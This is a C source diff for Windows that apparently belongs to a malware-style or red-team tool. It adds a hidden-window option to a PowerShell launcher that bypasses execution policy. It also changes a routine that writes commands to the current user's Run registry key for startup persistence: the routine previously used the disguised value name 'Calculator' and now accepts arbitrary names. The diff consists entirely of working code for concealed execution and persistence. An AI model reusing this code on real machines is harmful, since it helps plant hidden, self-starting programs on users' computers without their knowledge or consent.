@@ -49,23 +49,31 @@ int run_command(char command[]) {
 int run_powershell_script(char powerShellScriptPath[]) {
     const size_t bufferLen = 300;
     char scriptCommand[bufferLen];
-    snprintf(scriptCommand, bufferLen, "powershell -ExecutionPolicy Bypass -Command \"& '%s'\"", powerShellScriptPath);
+    snprintf(
+        scriptCommand, 
+        bufferLen, 
+        "powershell -ExecutionPolicy Bypass -WindowStyle hidden -Command \"& '%s'\"", 
+        powerShellScriptPath
+    );
     return run_command(scriptCommand);
 }
 
-int write_to_startup_regkey(char command[]) {
-    size_t bufferLen = strlen(command) + 1;
+int write_to_startup_regkey(char name[], char command[]) {
+    size_t bufferLen;
+    bufferLen = strlen(name) + 1;
+    WCHAR name_wchar[bufferLen];
+    mbstowcs(name_wchar, name, bufferLen);    
+    bufferLen = strlen(command) + 1;
     WCHAR command_wchar[bufferLen];
     mbstowcs(command_wchar, command, bufferLen);
-    swprintf(command_wchar, bufferLen, L"%hs", command);
     LPCWSTR key_name = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
     HKEY key;
 
     if (RegOpenKeyExW(HKEY_CURRENT_USER, key_name, 0, KEY_SET_VALUE | KEY_WOW64_64KEY, &key) == ERROR_SUCCESS)
     {
-        if (RegSetValueExW(key, L"Calculator", 0, REG_SZ, (LPBYTE)&command_wchar, sizeof(command_wchar)) == ERROR_SUCCESS)
+        if (RegSetValueExW(key, name_wchar, 0, REG_SZ, (LPBYTE)&command_wchar, sizeof(command_wchar)) == ERROR_SUCCESS)
         {
-            printf("Command added to startup: %s \n", command);
+            printf("Command %s added to startup: %s \n", name, command);
         }
         else {
             printf("Key not changed in registry :( \n");
